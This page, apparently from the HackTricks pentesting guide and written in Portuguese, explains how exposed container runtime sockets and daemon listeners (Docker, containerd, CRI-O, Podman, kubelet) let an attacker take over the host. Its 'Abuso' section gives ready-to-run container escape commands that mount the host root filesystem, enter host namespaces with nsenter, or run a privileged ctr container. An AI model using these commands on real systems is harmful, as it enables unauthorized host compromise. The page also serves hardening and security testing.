# API de Runtime e Exposição do Daemon

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

Muitos compromissos reais de containers não começam com uma fuga de namespace. Começam com acesso ao plano de controle do runtime. Se um workload consegue falar com `dockerd`, `containerd`, CRI-O, Podman, ou kubelet através de um socket Unix montado ou de um listener TCP exposto, o atacante pode conseguir requisitar um novo container com privilégios maiores, montar o filesystem do host, juntar namespaces do host ou recuperar informações sensíveis do node. Nesses casos, a API do runtime é a real fronteira de segurança, e comprometê‑la é funcionalmente próximo a comprometer o host.

Por isso a exposição do socket do runtime deve ser documentada separadamente das proteções do kernel. Um container com seccomp, capabilities e MAC confinement ordinários ainda pode estar a uma única chamada de API de comprometer o host se `/var/run/docker.sock` ou `/run/containerd/containerd.sock` estiverem montados dentro dele. O isolamento do kernel do container atual pode estar funcionando exatamente como projetado enquanto o plano de gerenciamento do runtime permanece totalmente exposto.

## Modelos de Acesso ao Daemon

Docker Engine tradicionalmente expõe sua API privilegiada através do socket Unix local em `unix:///var/run/docker.sock`. Historicamente também foi exposta remotamente através de listeners TCP como `tcp://0.0.0.0:2375` ou um listener protegido por TLS em `2376`. Expor o daemon remotamente sem TLS forte e autenticação de cliente efetivamente transforma a Docker API em uma interface remota com privilégios de root.

containerd, CRI-O, Podman e kubelet expõem superfícies de alto impacto similares. Os nomes e fluxos de trabalho diferem, mas a lógica não. Se a interface permite ao chamador criar workloads, montar paths do host, recuperar credenciais ou alterar containers em execução, a interface é um canal de gerenciamento privilegiado e deve ser tratada como tal.

Common local paths worth checking are:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Stacks mais antigas ou mais especializadas também podem expor endpoints como `dockershim.sock`, `frakti.sock` ou `rktlet.sock`. Estes são menos comuns em ambientes modernos, mas quando encontrados devem ser tratados com a mesma cautela porque representam runtime-control surfaces em vez de ordinary application sockets.

## Acesso Remoto Seguro

Se um daemon precisar ser exposto além do socket local, a conexão deve ser protegida com TLS e, preferencialmente, com mutual authentication, de forma que o daemon verifique o cliente e o cliente verifique o daemon. O hábito antigo de abrir o Docker daemon em plain HTTP por conveniência é um dos erros mais perigosos na administração de containers, porque a API surface é forte o suficiente para criar privileged containers diretamente.

O padrão histórico de configuração do Docker era o seguinte:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Em hosts baseados em systemd, a comunicação do daemon também pode aparecer como `fd://`, significando que o processo herda um socket pré-aberto do systemd em vez de vinculá-lo diretamente. A lição importante não é a sintaxe exata, mas a consequência de segurança. No momento em que o daemon escuta além de um socket local com permissões restritas, a segurança de transporte e a autenticação do cliente tornam-se obrigatórias em vez de medidas de hardening opcionais.

## Abuso

Se um runtime socket estiver presente, confirme qual é, se existe um cliente compatível e se acesso HTTP cru ou gRPC é possível:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Esses comandos são úteis porque distinguem entre um caminho morto, um socket montado mas inacessível, e uma API privilegiada ativa. Se o cliente obtiver sucesso, a próxima pergunta é se a API pode lançar um novo container com um host bind mount ou host namespace sharing.

### Exemplo completo: Docker Socket To Host Root

Se `docker.sock` estiver acessível, o escape clássico é iniciar um novo container que monte o sistema de arquivos raiz do host e então `chroot` nele:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Isso fornece execução direta host-root através do Docker daemon. O impacto não se limita à leitura de arquivos. Uma vez dentro do novo container, o atacante pode alterar arquivos do host, coletar credenciais, implantar persistência ou iniciar cargas de trabalho adicionais privilegiadas.

### Exemplo completo: Docker Socket To Host Namespaces

Se o atacante preferir entrada em namespaces ao invés de acesso apenas ao filesystem:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Este caminho alcança o host solicitando ao runtime que crie um novo container com exposição explícita do host-namespace, em vez de explorar o atual.

### Exemplo Completo: containerd Socket

Um socket `containerd` montado geralmente é igualmente perigoso:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
O impacto é, novamente, o comprometimento do host. Mesmo que ferramentas específicas do Docker estejam ausentes, outra runtime API ainda pode oferecer o mesmo poder administrativo.

## Checks

O objetivo dessas verificações é responder se o container pode alcançar qualquer plano de gerenciamento que deveria ter permanecido fora do limite de confiança.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
O que é interessante aqui:

- Um socket de runtime montado geralmente é um primitivo administrativo direto, em vez de mera divulgação de informação.
- Um listener TCP em `2375` sem TLS deve ser tratado como uma condição de comprometimento remoto.
- Variáveis de ambiente como `DOCKER_HOST` frequentemente revelam que a workload foi intencionalmente projetada para se comunicar com o runtime do host.

## Padrões de runtime

| Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Docker Engine | Local Unix socket por padrão | `dockerd` escuta no socket local e o daemon geralmente roda como root | montagem de `/var/run/docker.sock`, exposição de `tcp://...:2375`, TLS fraco ou ausente em `2376` |
| Podman | CLI sem daemon por padrão | Nenhum daemon privilegiado de longa duração é necessário para uso local comum; sockets de API ainda podem ser expostos quando `podman system service` estiver habilitado | exposição de `podman.sock`, execução ampla do serviço, uso de API com privilégios de root |
| containerd | Socket local privilegiado | API administrativa exposta através do socket local e normalmente consumida por ferramentas de nível superior | montagem de `containerd.sock`, acesso amplo via `ctr` ou `nerdctl`, exposição de namespaces privilegiados |
| CRI-O | Socket local privilegiado | O endpoint CRI é destinado a componentes confiáveis locais ao nó | montagem de `crio.sock`, expondo o endpoint CRI para workloads não confiáveis |
| Kubernetes kubelet | API de gerenciamento local do nó | Kubelet não deveria ser amplamente acessível a partir de Pods; o acesso pode expor o estado do pod, credenciais e recursos de execução dependendo de authn/authz | montagem de sockets ou certificados do kubelet, autenticação fraca do kubelet, rede host mais endpoint do kubelet alcançável |
{{#include ../../../banners/hacktricks-training.md}}
